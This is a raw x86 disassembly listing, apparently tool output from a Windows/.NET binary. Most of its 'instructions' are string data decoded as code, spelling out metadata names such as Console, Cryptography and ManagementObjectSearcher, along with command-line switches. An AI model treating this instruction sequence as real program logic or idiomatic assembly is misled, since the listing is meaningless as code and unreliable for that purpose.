  404fb1:	outs   dx,DWORD PTR ds:[esi]
  404fb2:	ins    DWORD PTR es:[edi],dx
  404fb3:	jo     0x405016
  404fb5:	je     0x405020
  404fb7:	bound  ebp,QWORD PTR [ecx+0x6c]
  404fba:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  404fc2:	bound  esi,QWORD PTR [ebp+0x74]
  404fc5:	add    BYTE PTR gs:[ebx+0x79],dl
  404fc9:	jae    0x40503f
  404fcb:	gs ins DWORD PTR es:[edi],dx
  404fcd:	cs push ebx
  404fcf:	arpl   WORD PTR gs:[ebp+0x72],si
  404fd3:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  404fdb:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  404fe2:	add    BYTE PTR [ebx+0x65],dl
  404fe5:	arpl   WORD PTR [ebp+0x72],si
  404fe8:	imul   esi,DWORD PTR [ecx+edi*2+0x50],0x696d7265
  404ff0:	jae    0x405065
  404ff2:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  404ff9:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  405000:	arpl   WORD PTR gs:[ebp+0x72],si
  405004:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x6f697463
  40500c:	outs   dx,BYTE PTR ds:[esi]
  40500d:	add    BYTE PTR [ebx+0x79],dl
  405010:	jae    0x405086
  405012:	gs ins DWORD PTR es:[edi],dx
  405014:	cs inc esp
  405016:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  40501d:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  405024:	jne    0x40508d
  405026:	addr16 popa 
  405028:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  40502c:	je     0x4050a2
  40502e:	jb     0x405099
  405030:	bound  esi,QWORD PTR [ebp+0x74]
  405033:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  405038:	jne    0x4050a1
  40503a:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  405042:	jae    0x405044
  405044:	inc    ebx
  405045:	outs   dx,DWORD PTR ds:[esi]
  405046:	ins    DWORD PTR es:[edi],dx
  405047:	jo     0x4050b2
  405049:	ins    BYTE PTR es:[edi],dx
  40504a:	popa   
  40504b:	je     0x4050b6
  40504d:	outs   dx,DWORD PTR ds:[esi]
  40504e:	outs   dx,BYTE PTR ds:[esi]
  40504f:	push   edx
  405050:	gs ins BYTE PTR es:[edi],dx
  405052:	popa   
  405053:	js     0x4050b6
  405055:	je     0x4050c0
  405057:	outs   dx,DWORD PTR ds:[esi]
  405058:	outs   dx,BYTE PTR ds:[esi]
  405059:	jae    0x40509c
  40505b:	je     0x4050d1
  40505d:	jb     0x4050c8
  40505f:	bound  esi,QWORD PTR [ebp+0x74]
  405062:	add    BYTE PTR gs:[ecx+0x73],al
  405066:	jae    0x4050cd
  405068:	ins    DWORD PTR es:[edi],dx
  405069:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40506d:	inc    edi
  40506e:	gs je  0x4050b6
  405071:	js     0x4050d8
  405073:	arpl   WORD PTR [ebp+0x74],si
  405076:	imul   ebp,DWORD PTR [esi+0x67],0x65737341
  40507d:	ins    DWORD PTR es:[edi],dx
  40507e:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  405082:	inc    ecx
  405083:	jae    0x4050f8
  405085:	gs ins DWORD PTR es:[edi],dx
  405087:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  40508b:	popa   
  40508c:	ins    DWORD PTR es:[edi],dx
  40508d:	add    BYTE PTR gs:[edi+0x65],al
  405091:	je     0x4050e1
  405093:	popa   
  405094:	ins    DWORD PTR es:[edi],dx
  405095:	add    BYTE PTR gs:[edi+0x65],ah
  405099:	je     0x4050fa
  40509b:	dec    esi
  40509c:	popa   
  40509d:	ins    DWORD PTR es:[edi],dx
  40509e:	add    BYTE PTR gs:[ecx+edi*2+0x70],dl
  4050a3:	add    BYTE PTR gs:[edi+0x65],ah
  4050a7:	je     0x405108
  4050a9:	dec    esp
  4050aa:	outs   dx,DWORD PTR ds:[esi]
  4050ab:	arpl   WORD PTR [ecx+0x74],sp
  4050ae:	imul   ebp,DWORD PTR [edi+0x6e],0x6c694600
  4050b5:	gs push esi
  4050b7:	gs jb  0x40512d
  4050ba:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  4050c1:	add    BYTE PTR [edi+0x65],al
  4050c4:	je     0x40511c
  4050c6:	gs jb  0x40513c
  4050c9:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  4050d0:	add    BYTE PTR [edi+0x65],ah
  4050d3:	je     0x405134
  4050d5:	inc    esi
  4050d6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x44],0x72637365
  4050de:	imul   esi,DWORD PTR [eax+0x74],0x6e6f69
  4050e5:	addr16 gs je 0x405148
  4050e9:	push   eax
  4050ea:	jb     0x40515b
  4050ec:	fs jne 0x405152
  4050ef:	je     0x405147
  4050f1:	gs jb  0x405167
  4050f4:	imul   ebp,DWORD PTR [edi+0x6e],0x72745300
  4050fb:	imul   ebp,DWORD PTR [esi+0x67],0x6e6f4300
  405102:	arpl   WORD PTR [ecx+0x74],sp
  405105:	add    BYTE PTR [ebx+0x6f],al
  405108:	outs   dx,BYTE PTR ds:[esi]
  405109:	jae    0x40517a
  40510b:	ins    BYTE PTR es:[edi],dx
  40510c:	add    BYTE PTR gs:[edi+0x72],dl
  405110:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
  405118:	addr16 gs je 0x40517b
  40511c:	dec    esp
  40511d:	gs addr16 popa 
  405120:	ins    BYTE PTR es:[edi],dx
  405121:	inc    ebx
  405122:	outs   dx,DWORD PTR ds:[esi]
  405123:	jo     0x40519e
  405125:	jb     0x405190
  405127:	addr16 push 0x79530074
  40512d:	jae    0x4051a3
  40512f:	gs ins DWORD PTR es:[edi],dx
  405131:	cs push esp
  405133:	push   0x64616572
  405138:	imul   ebp,DWORD PTR [esi+0x67],0x72685400
  40513f:	gs popa 
  405141:	add    BYTE PTR fs:[edi+0x65],ah
  405145:	je     0x4051a6
  405147:	inc    ebx
  405148:	jne    0x4051bc
  40514a:	jb     0x4051b1
  40514c:	outs   dx,BYTE PTR ds:[esi]
  40514d:	je     0x4051a3
  40514f:	push   0x64616572
  405154:	add    BYTE PTR [edi+0x65],ah
  405157:	je     0x4051b8
  405159:	inc    ebx
  40515a:	jne    0x4051ce
  40515c:	jb     0x4051c3
  40515e:	outs   dx,BYTE PTR ds:[esi]
  40515f:	je     0x4051b6
  405161:	dec    ecx
  405162:	inc    ebx
  405163:	jne    0x4051d1
  405165:	je     0x4051dc
  405167:	jb     0x4051ce
  405169:	add    BYTE PTR [edi+0x70],ch
  40516c:	pop    edi
  40516d:	inc    ebp
  40516e:	jno    0x4051e5
  405170:	popa   
  405171:	ins    BYTE PTR es:[edi],dx
  405172:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x74706d45
  40517a:	jns    0x40517c
  40517c:	addr16 gs je 0x4051df
  405180:	dec    ecx
  405181:	outs   dx,BYTE PTR ds:[esi]
  405182:	jbe    0x4051e5
  405184:	jb     0x4051ef
  405186:	popa   
  405187:	outs   dx,BYTE PTR ds:[esi]
  405188:	je     0x4051cd
  40518a:	jne    0x4051f8
  40518c:	je     0x405203
  40518e:	jb     0x4051f5
  405190:	add    BYTE PTR [edi+ebp*2+0x55],dl
  405194:	jo     0x405206
  405196:	gs jb  0x405199
  405199:	addr16 gs je 0x4051fc
  40519d:	dec    esp
  40519e:	outs   dx,BYTE PTR gs:[esi]
  4051a0:	addr16 je 0x40520b
  4051a3:	add    BYTE PTR [edi+0x72],dl
  4051a6:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x53746547
  4051ae:	je     0x405222
  4051b0:	outs   dx,DWORD PTR ds:[esi]
  4051b1:	outs   dx,BYTE PTR ds:[esi]
  4051b2:	ins    BYTE PTR es:[di],dx
  4051b4:	jns    0x40520a
  4051b6:	jns    0x405228
  4051b8:	gs fs inc ebx
  4051bb:	ins    BYTE PTR es:[edi],dx
  4051bc:	popa   
  4051bd:	jae    0x405232
  4051bf:	inc    ebx
  4051c0:	outs   dx,DWORD PTR ds:[esi]
  4051c1:	fs add BYTE PTR gs:[ebp+0x78],al
  4051c6:	arpl   WORD PTR [ebp+0x70],sp
  4051c9:	je     0x405234
  4051cb:	outs   dx,DWORD PTR ds:[esi]
  4051cc:	outs   dx,BYTE PTR ds:[esi]
  4051cd:	add    BYTE PTR [edi+0x65],ah
  4051d0:	je     0x405231
  4051d2:	dec    ebp
  4051d3:	gs jae 0x405249
  4051d6:	popa   
  4051d7:	add    BYTE PTR gs:[bx+di+0x6e],cl
  4051dc:	fs gs js 0x40522f
  4051e0:	data16 add BYTE PTR [ebx+0x75],dl
  4051e4:	bound  esi,QWORD PTR [ebx+0x74]
  4051e7:	jb     0x405252
  4051e9:	outs   dx,BYTE PTR ds:[esi]
  4051ea:	add    BYTE PTR [bp+di+0x79],dl
  4051ee:	jae    0x405264
  4051f0:	gs ins DWORD PTR es:[edi],dx
  4051f2:	cs dec ecx
  4051f4:	dec    edi
  4051f5:	add    BYTE PTR [eax+0x61],dl
  4051f8:	je     0x405262
  4051fa:	add    BYTE PTR [edi+0x65],al
  4051fd:	je     0x405245
  4051ff:	jne    0x40526d
  405201:	ins    BYTE PTR es:[edi],dx
  405202:	push   eax
  405203:	popa   
  405204:	je     0x40526e
  405206:	add    BYTE PTR [eax+0x61],dl
  405209:	je     0x405273
  40520b:	push   esp
  40520c:	outs   dx,DWORD PTR ds:[esi]
  40520d:	outs   dx,DWORD PTR ds:[esi]
  40520e:	dec    esp
  40520f:	outs   dx,DWORD PTR ds:[esi]
  405210:	outs   dx,BYTE PTR ds:[esi]
  405211:	addr16 inc ebp
  405213:	js     0x405278
  405215:	gs jo  0x40528c
  405218:	imul   ebp,DWORD PTR [edi+0x6e],0x6e6f4300
  40521f:	outs   dx,BYTE PTR ds:[esi]
  405220:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  405225:	outs   dx,BYTE PTR ds:[esi]
  405226:	dec    edi
  405227:	jo     0x40529d
  405229:	imul   ebp,DWORD PTR [edi+0x6e],0x65730073
  405230:	je     0x405291
  405232:	push   ebp
  405233:	jae    0x40529a
  405235:	jb     0x4052a5
  405237:	popa   
  405238:	ins    DWORD PTR es:[edi],dx
  405239:	add    BYTE PTR gs:[ebx+0x65],dh
  40523d:	je     0x40529e
  40523f:	push   eax
  405240:	popa   
  405241:	jae    0x4052b6
  405243:	ja     0x4052b4
  405245:	jb     0x4052ab
  405247:	add    BYTE PTR [ebx+0x65],dh
  40524a:	je     0x4052ab
  40524c:	inc    ecx
  40524d:	jne    0x4052c3
  40524f:	push   0x7469726f
  405254:	jns    0x405256
  405256:	dec    ebp
  405257:	popa   
  405258:	outs   dx,BYTE PTR ds:[esi]
  405259:	popa   
  40525a:	gs ins DWORD PTR es:[di],dx
  40525d:	outs   dx,BYTE PTR gs:[esi]
  40525f:	je     0x4052b1
  405261:	popa   
  405262:	je     0x4052cc
  405264:	add    BYTE PTR [ebx+0x65],dh
  405267:	je     0x4052c8
  405269:	push   eax
  40526a:	popa   
  40526b:	je     0x4052d5
  40526d:	add    BYTE PTR [edi+0x65],ah
  405270:	je     0x4052d1
  405272:	dec    esi
  405273:	popa   
  405274:	ins    DWORD PTR es:[edi],dx
  405275:	gs jae 0x4052e8
  405278:	popa   
  405279:	arpl   WORD PTR [ebp+0x50],sp
  40527c:	popa   
  40527d:	je     0x4052e7
  40527f:	add    BYTE PTR [ebx+0x65],dh
  405282:	je     0x4052e3
  405284:	dec    esi
  405285:	popa   
  405286:	ins    DWORD PTR es:[edi],dx
  405287:	gs jae 0x4052fa
  40528a:	popa   
  40528b:	arpl   WORD PTR [ebp+0x50],sp
  40528e:	popa   
  40528f:	je     0x4052f9
  405291:	add    BYTE PTR [ebx+0x65],dh
  405294:	je     0x4052f5
  405296:	push   ebx
  405297:	gs jb  0x405310
  40529a:	gs jb  0x40529d
  40529d:	dec    edi
  40529e:	bound  ebp,QWORD PTR [edx+0x65]
  4052a1:	arpl   WORD PTR [edi+eax*2+0x65],si
  4052a5:	je     0x4052f6
  4052a7:	jo     0x40531d
  4052a9:	imul   ebp,DWORD PTR [edi+0x6e],0x65730073
  4052b0:	je     0x405311
  4052b2:	push   ebp
  4052b3:	jae    0x40531a
  4052b5:	inc    ecx
  4052b6:	ins    DWORD PTR es:[edi],dx
  4052b7:	outs   dx,BYTE PTR gs:[esi]
  4052b9:	fs gs fs push ecx
  4052bd:	jne    0x405320
  4052bf:	ins    BYTE PTR es:[edi],dx
  4052c0:	imul   esp,DWORD PTR [esi+0x69],0x737265
  4052c7:	dec    ebp
  4052c8:	popa   
  4052c9:	outs   dx,BYTE PTR ds:[esi]
  4052ca:	popa   
  4052cb:	gs ins DWORD PTR es:[di],dx
  4052ce:	outs   dx,BYTE PTR gs:[esi]
  4052d0:	je     0x405325
  4052d2:	arpl   WORD PTR [edi+0x70],bp
  4052d5:	add    BYTE PTR gs:[ebp+0x61],cl
  4052d9:	outs   dx,BYTE PTR ds:[esi]
  4052da:	popa   
  4052db:	gs ins DWORD PTR es:[di],dx
  4052de:	outs   dx,BYTE PTR gs:[esi]
  4052e0:	je     0x405331
  4052e2:	bound  ebp,QWORD PTR [edx+0x65]
  4052e5:	arpl   WORD PTR [eax+eax*1+0x47],si
  4052e9:	gs je  0x4052ec
  4052ec:	addr16 gs je 0x40534f
  4052f0:	inc    ebx
  4052f1:	ins    BYTE PTR es:[edi],dx
  4052f2:	popa   
  4052f3:	jae    0x405368
  4052f5:	dec    esi
  4052f6:	popa   
  4052f7:	ins    DWORD PTR es:[edi],dx
  4052f8:	add    BYTE PTR gs:[ebp+0x61],cl
  4052fc:	outs   dx,BYTE PTR ds:[esi]
  4052fd:	popa   
  4052fe:	gs ins DWORD PTR es:[di],dx
  405301:	outs   dx,BYTE PTR gs:[esi]
  405303:	je     0x40534a
  405305:	js     0x40536a
  405307:	gs jo  0x40537e
  40530a:	imul   ebp,DWORD PTR [edi+0x6e],0x6e614d00
  405311:	popa   
  405312:	gs ins DWORD PTR es:[di],dx
  405315:	outs   dx,BYTE PTR gs:[esi]
  405317:	je     0x40536c
  405319:	je     0x40537c
  40531b:	je     0x405392
  40531d:	jae    0x40531f
  40531f:	addr16 gs je 0x405382
  405323:	inc    ebp
  405324:	jb     0x405398
  405326:	outs   dx,DWORD PTR ds:[esi]
  405327:	jb     0x40536c
  405329:	outs   dx,DWORD PTR ds:[esi]
  40532a:	fs add BYTE PTR gs:[ebx+0x68],al
  40532f:	popa   
  405330:	jb     0x405332
  405332:	arpl   WORD PTR cs:[ebx+0x74],sp
  405336:	outs   dx,DWORD PTR ds:[esi]
  405337:	jb     0x405339
  405339:	inc    ebx
  40533a:	jb     0x4053a1
  40533c:	popa   
  40533d:	je     0x4053a4
  40533f:	add    BYTE PTR [ebx+0x79],dl
  405342:	ins    DWORD PTR es:[edi],dx
  405343:	ins    DWORD PTR es:[edi],dx
  405344:	gs je  0x4053b9
  405347:	imul   esp,DWORD PTR [ebx+0x41],0x726f676c
  40534e:	imul   esi,DWORD PTR [eax+ebp*2+0x6d],0x6e654700
  405356:	gs jb  0x4053ba
  405359:	je     0x4053c0
  40535b:	dec    ebx
  40535c:	gs jns 0x40535f
  40535f:	inc    edi
  405360:	outs   dx,BYTE PTR gs:[esi]
  405362:	gs jb  0x4053c6
  405365:	je     0x4053cc
  405367:	dec    ecx
  405368:	push   esi
  405369:	add    BYTE PTR [ecx+0x43],cl
  40536c:	jb     0x4053e7
  40536e:	jo     0x4053e4
  405370:	outs   dx,DWORD PTR ds:[esi]
  405371:	push   esp
  405372:	jb     0x4053d5
  405374:	outs   dx,BYTE PTR ds:[esi]
  405375:	jae    0x4053dd
  405377:	outs   dx,DWORD PTR ds:[esi]
  405378:	jb     0x4053e7
  40537a:	add    BYTE PTR [ebx+0x72],al
  40537d:	gs popa 
  40537f:	je     0x4053e6
  405381:	inc    ebp
  405382:	outs   dx,BYTE PTR ds:[esi]
  405383:	arpl   WORD PTR [edx+0x79],si
  405386:	jo     0x4053fc
  405388:	outs   dx,DWORD PTR ds:[esi]
  405389:	jb     0x40538b
  40538b:	push   ebx
  40538c:	jns    0x405401
  40538e:	je     0x4053f5
  405390:	ins    DWORD PTR es:[edi],dx
  405391:	cs push esp
  405393:	gs js  0x40540a
  405396:	add    BYTE PTR [ebp+0x6e],al
  405399:	arpl   WORD PTR [edi+0x64],bp
  40539c:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  4053a3:	pop    edi
  4053a4:	push   ebp
  4053a5:	outs   dx,BYTE PTR ds:[esi]
  4053a6:	imul   esp,DWORD PTR [ebx+0x6f],0x47006564
  4053ad:	gs je  0x4053f2
  4053b0:	jns    0x405426
  4053b2:	gs jae 0x4053b5
  4053b5:	push   esp
  4053b6:	jb     0x405419
  4053b8:	outs   dx,BYTE PTR ds:[esi]
  4053b9:	jae    0x405421
  4053bb:	outs   dx,DWORD PTR ds:[esi]
  4053bc:	jb     0x40542b
  4053be:	inc    esi
  4053bf:	imul   ebp,DWORD PTR [esi+0x61],0x6f6c426c
  4053c6:	arpl   WORD PTR [ebx+0x0],bp
  4053c9:	inc    ebx
  4053ca:	jb     0x405431
  4053cc:	popa   
  4053cd:	je     0x405434
  4053cf:	inc    esp
  4053d0:	arpl   WORD PTR gs:[edx+0x79],si
  4053d4:	jo     0x40544a
  4053d6:	outs   dx,DWORD PTR ds:[esi]
  4053d7:	jb     0x4053d9
  4053d9:	inc    esp
  4053da:	ins    BYTE PTR es:[edi],dx
  4053db:	ins    BYTE PTR es:[edi],dx
  4053dc:	dec    ecx
  4053dd:	ins    DWORD PTR es:[edi],dx
  4053de:	jo     0x40544f
  4053e0:	jb     0x405456
  4053e2:	inc    ecx
  4053e3:	je     0x405459
  4053e5:	jb     0x405450
  4053e7:	bound  esi,QWORD PTR [ebp+0x74]
  4053ea:	add    BYTE PTR gs:[ebp+0x73],ch
  4053ee:	jbe    0x405453
  4053f0:	jb     0x405466
  4053f2:	cs fs ins BYTE PTR es:[edi],dx
  4053f5:	ins    BYTE PTR es:[edi],dx
  4053f6:	add    BYTE PTR [edi+0x67],bl
  4053f9:	gs je  0x40545f
  4053fc:	push   0x74744100
  405401:	jb     0x40546c
  405403:	bound  esi,QWORD PTR [ebp+0x74]
  405406:	gs push ebp
  405408:	jae    0x40546b
  40540a:	addr16 gs inc ecx
  40540d:	je     0x405483
  40540f:	jb     0x40547a
  405411:	bound  esi,QWORD PTR [ebp+0x74]
  405414:	add    BYTE PTR gs:[ecx+0x74],al
  405418:	je     0x40548c
  40541a:	imul   esp,DWORD PTR [edx+0x75],0x61546574
  405421:	jb     0x40548a
  405423:	gs je  0x405499
  405426:	add    BYTE PTR [ebx+0x65],dh
  405429:	je     0x40548a
  40542b:	inc    esp
  40542c:	gs jae 0x405492
  40542f:	jb     0x40549a
  405431:	jo     0x4054a7
  405433:	imul   ebp,DWORD PTR [edi+0x6e],0x756c6156
  40543a:	add    BYTE PTR gs:[edi+0x65],al
  40543e:	je     0x405494
  405440:	jns    0x4054b2
  405442:	add    BYTE PTR gs:[edi+0x65],ah
  405446:	je     0x4054a7
  405448:	inc    ecx
  405449:	jae    0x4054be
  40544b:	gs ins DWORD PTR es:[edi],dx
  40544d:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  405451:	dec    ecx
  405452:	outs   dx,BYTE PTR ds:[esi]
  405453:	je     0x4054ba
  405455:	jb     0x4054c3
  405457:	outs   dx,DWORD PTR ds:[esi]
  405458:	arpl   WORD PTR [ebx+0x65],bp
  40545b:	add    BYTE PTR fs:[ebx+0x6f],al
  40545f:	ins    DWORD PTR es:[edi],dx
  405460:	jo     0x4054c3
  405462:	jb     0x4054c9
  405464:	inc    ebp
  405465:	js     0x4054ca
  405467:	push   0x65676e61
  40546c:	add    BYTE PTR [edi+0x65],ah
  40546f:	je     0x4054d0
  405471:	inc    ebx
  405472:	jne    0x4054e6
  405474:	jb     0x4054db
  405476:	outs   dx,BYTE PTR ds:[esi]
  405477:	je     0x4054bc
  405479:	jne    0x4054e7
  40547b:	je     0x4054f2
  40547d:	jb     0x4054e4
  40547f:	add    BYTE PTR [ecx+0x46],cl
  405482:	outs   dx,DWORD PTR ds:[esi]
  405483:	jb     0x4054f2
  405485:	popa   
  405486:	je     0x4054d8
  405488:	jb     0x4054f9
  40548a:	jbe    0x4054f5
  40548c:	fs gs jb 0x405490
  405490:	inc    esi
  405491:	outs   dx,DWORD PTR ds:[esi]
  405492:	jb     0x405501
  405494:	popa   
  405495:	je     0x405497
  405497:	push   ebx
  405498:	jns    0x40550d
  40549a:	je     0x405501
  40549c:	ins    DWORD PTR es:[edi],dx
  40549d:	cs push ebx
  40549f:	arpl   WORD PTR gs:[ebp+0x72],si
  4054a3:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x65766e55
  4054ab:	jb     0x405516
  4054ad:	imul   sp,WORD PTR [ecx+0x62],0x656c
  4054b3:	inc    ebx
  4054b4:	outs   dx,DWORD PTR ds:[esi]
  4054b5:	fs gs inc ecx
  4054b8:	je     0x40552e
  4054ba:	jb     0x405525
  4054bc:	bound  esi,QWORD PTR [ebp+0x74]
  4054bf:	add    BYTE PTR gs:[ebp+0x67],cl
  4054c3:	ins    DWORD PTR es:[edi],dx
  4054c4:	je     0x405509
  4054c6:	ins    BYTE PTR es:[edi],dx
  4054c7:	popa   
  4054c8:	jae    0x40553d
  4054ca:	inc    edi
  4054cb:	outs   dx,BYTE PTR gs:[esi]
  4054cd:	cs jb  0x405535
  4054d0:	jae    0x405541
  4054d2:	jne    0x405546
  4054d4:	arpl   WORD PTR [ebp+0x73],sp
  4054d7:	add    BYTE PTR [eax],al
  4054d9:	sbb    eax,0x69004d
  4054de:	arpl   WORD PTR [eax],ax
  4054e0:	jb     0x4054e2
  4054e2:	outs   dx,DWORD PTR ds:[esi]
  4054e3:	add    BYTE PTR [ebx+0x0],dh
  4054e6:	outs   dx,DWORD PTR ds:[esi]
  4054e7:	add    BYTE PTR [esi+0x0],ah
  4054ea:	je     0x4054ec
  4054ec:	and    BYTE PTR [eax],al
  4054ee:	sub    BYTE PTR [eax],al
  4054f0:	push   edx
  4054f1:	add    BYTE PTR [ecx],ch
  4054f3:	add    BYTE PTR [eax],ah
  4054f5:	add    BYTE PTR [eax],al
  4054f7:	adc    esp,DWORD PTR [eax]
  4054f9:	add    BYTE PTR [esi+0x0],dl
  4054fc:	add    BYTE PTR gs:[edx+0x0],dh
  405500:	jae    0x405502
  405502:	imul   eax,DWORD PTR [eax],0x6e006f
  405508:	and    BYTE PTR [eax],al
  40550a:	add    BYTE PTR ds:0x3f002f,al
  405510:	add    BYTE PTR ds:0x3f002d,al
  405516:	add    DWORD PTR [ebx],ebx
  405518:	imul   eax,DWORD PTR [eax],0x76006e
  40551e:	popa   
  40551f:	add    BYTE PTR [eax+eax*1+0x69],ch
  405523:	add    BYTE PTR [eax+eax*1+0x41],ah
  405527:	add    BYTE PTR [edx+0x0],dh
  40552a:	add    BYTE PTR [di+0x0],al
  40552e:	jb     0x405530
  405530:	jb     0x405532
  405532:	add    BYTE PTR ds:0x530043,al
  405538:	add    BYTE PTR ds:0x4c002d,al
  40553e:	add    DWORD PTR ds:0x4c002f,eax
  405544:	add    BYTE PTR ds:0x4e002d,al
  40554a:	add    DWORD PTR ds:0x4e002f,eax
  405550:	add    BYTE PTR ds:0x4d002d,al
  405556:	add    DWORD PTR ds:0x4d002f,eax
  40555c:	add    BYTE PTR ds:0x50002d,al
  405562:	add    DWORD PTR ds:0x50002f,eax
  405568:	add    BYTE PTR ds:0x55002d,al
  40556e:	add    DWORD PTR ds:0x55002f,eax
  405574:	add    BYTE PTR [edi],al
  405576:	sub    eax,0x57005000
  40557b:	add    BYTE PTR [ecx],al
  40557d:	pop    es
  40557e:	das    
  40557f:	add    BYTE PTR [eax+0x0],dl
  405582:	push   edi
  405583:	add    BYTE PTR [eax],al
  405585:	add    eax,0x4f002d
  40558a:	add    DWORD PTR ds:0x4f002f,eax
  405590:	add    BYTE PTR [ebx],al
  405592:	sub    al,BYTE PTR [eax]
  405594:	add    BYTE PTR ds:0x6f006e,bl
  40559a:	inc    ebx
  40559b:	add    BYTE PTR [eax+eax*1+0x61],ch
  40559f:	add    BYTE PTR [ebx+0x0],dh
  4055a2:	jae    0x4055a4
  4055a4:	dec    esi
  4055a5:	add    BYTE PTR [ecx+0x0],ah
  4055a8:	ins    DWORD PTR es:[edi],dx
  4055a9:	add    BYTE PTR [ebp+0x0],ah
  4055ac:	inc    ebp
  4055ad:	add    BYTE PTR [edx+0x0],dh
  4055b0:	jb     0x4055b2
  4055b2:	add    BYTE PTR [ecx],al
  4055b4:	add    BYTE PTR [ecx],bl
  4055b6:	push   eax
  4055b7:	add    BYTE PTR [ecx+0x0],ah
  4055ba:	jae    0x4055bc
  4055bc:	jae    0x4055be
  4055be:	ja     0x4055c0
  4055c0:	add    BYTE PTR fs:[eax+0x0],dl
  4055c4:	jb     0x4055c6
  4055c6:	outs   dx,DWORD PTR ds:[esi]
  4055c7:	add    BYTE PTR [ebp+0x0],ch
  4055ca:	jo     0x4055cc
  4055cc:	je     0x4055ce
  4055ce:	add    BYTE PTR [edi],ah
  4055d0:	add    BYTE PTR [di+0x0],ah
  4055d4:	outs   dx,BYTE PTR ds:[esi]
  4055d5:	add    BYTE PTR [ebp+0x0],ah
  4055d8:	jb     0x4055da
  4055da:	popa   
  4055db:	add    BYTE PTR [eax+eax*1+0x69],dh
  4055df:	add    BYTE PTR [esi+0x0],ch
  4055e2:	add    BYTE PTR [bp+di+0x0],al
  4055e6:	ins    BYTE PTR es:[edi],dx
  4055e7:	add    BYTE PTR [ecx+0x0],ah
  4055ea:	jae    0x4055ec
  4055ec:	jae    0x4055ee
  4055ee:	dec    esi
  4055ef:	add    BYTE PTR [ecx+0x0],ah
  4055f2:	ins    DWORD PTR es:[edi],dx
  4055f3:	add    BYTE PTR [ebp+0x0],ah
  4055f6:	add    BYTE PTR [ebx],al
  4055f8:	and    BYTE PTR [eax],al
  4055fa:	add    BYTE PTR [ecx],cl
  4055fc:	and    BYTE PTR [eax],al
  4055fe:	add    BYTE PTR cs:[esi],ch
  405601:	add    BYTE PTR [esi],ch
  405603:	add    BYTE PTR [eax],al
  405605:	sbb    eax,0x6f0063
  40560a:	add    BYTE PTR fs:[ebp+0x0],ah
  40560e:	inc    edi
  40560f:	add    BYTE PTR [ebp+0x0],ah
  405612:	outs   dx,BYTE PTR ds:[esi]
  405613:	add    BYTE PTR [ebx+0x0],dl
  405616:	jne    0x405618
  405618:	arpl   WORD PTR [eax],ax
  40561a:	arpl   WORD PTR [eax],ax
  40561c:	add    BYTE PTR gs:[ebx+0x0],dh
  405620:	jae    0x405622
  405622:	add    BYTE PTR ds:0x6f0063,dl
  405628:	add    BYTE PTR fs:[ebp+0x0],ah
  40562c:	inc    edi
  40562d:	add    BYTE PTR [ebp+0x0],ah
  405630:	outs   dx,BYTE PTR ds:[esi]
  405631:	add    BYTE PTR [ebp+0x0],al
  405634:	jb     0x405636
  405636:	jb     0x405638
  405638:	add    BYTE PTR ds:0x650067,dl
  40563e:	outs   dx,BYTE PTR ds:[esi]
  40563f:	add    BYTE PTR [ebp+0x0],ah
  405642:	jb     0x405644
  405644:	imul   eax,DWORD PTR [eax],0x450063
  40564a:	jb     0x40564c
  40564c:	jb     0x40564e
  40564e:	add    BYTE PTR [ebx],dh
  405650:	dec    ebp
  405651:	add    BYTE PTR [edi+0x0],ah
  405654:	ins    DWORD PTR es:[edi],dx
  405655:	add    BYTE PTR [eax+eax*1+0x43],dh
  405659:	add    BYTE PTR [eax+eax*1+0x61],ch
  40565d:	add    BYTE PTR [ebx+0x0],dh
  405660:	jae    0x405662
  405662:	inc    edi
  405663:	add    BYTE PTR [ebp+0x0],ah
  405666:	outs   dx,BYTE PTR ds:[esi]
  405667:	add    BYTE PTR [eax],ah
  405669:	add    BYTE PTR [eax+eax*1],bh
  40566c:	push   edi
  40566d:	add    BYTE PTR [ebp+0x0],cl
  405670:	dec    ecx
  405671:	add    BYTE PTR [ebx+0x0],al
  405674:	ins    BYTE PTR es:[edi],dx
  405675:	add    BYTE PTR [ecx+0x0],ah
  405678:	jae    0x40567a
  40567a:	jae    0x40567c
  40567c:	add    BYTE PTR ds:[eax],ah
  40567f:	add    BYTE PTR [ebx+0x0],bl
  405682:	add    BYTE PTR [edi],cl
  405684:	outs   dx,DWORD PTR ds:[esi]
  405685:	add    BYTE PTR [eax+0x0],dh
  405688:	je     0x40568a
  40568a:	imul   eax,DWORD PTR [eax],0x6e006f
  405690:	jae    0x405692
  405692:	add    BYTE PTR ds:0xa005d,al
  405698:	add    BYTE PTR [ecx],bl
  40569a:	ja     0x40569c
  40569c:	ins    DWORD PTR es:[edi],dx
  40569d:	add    BYTE PTR [ecx+0x0],ch
  4056a0:	dec    esi
  4056a1:	add    BYTE PTR [ecx+0x0],ah
  4056a4:	ins    DWORD PTR es:[edi],dx
  4056a5:	add    BYTE PTR [ebp+0x0],ah
  4056a8:	push   ebx
  4056a9:	add    BYTE PTR [eax+0x0],dh
  4056ac:	popa   
  4056ad:	add    BYTE PTR [ebx+0x0],ah
  4056b0:	add    BYTE PTR gs:[eax],al
  4056b3:	sbb    eax,0x6c0063
  4056b8:	popa   
  4056b9:	add    BYTE PTR [ebx+0x0],dh
  4056bc:	jae    0x4056be
  4056be:	dec    esi
  4056bf:	add    BYTE PTR [ecx+0x0],ah
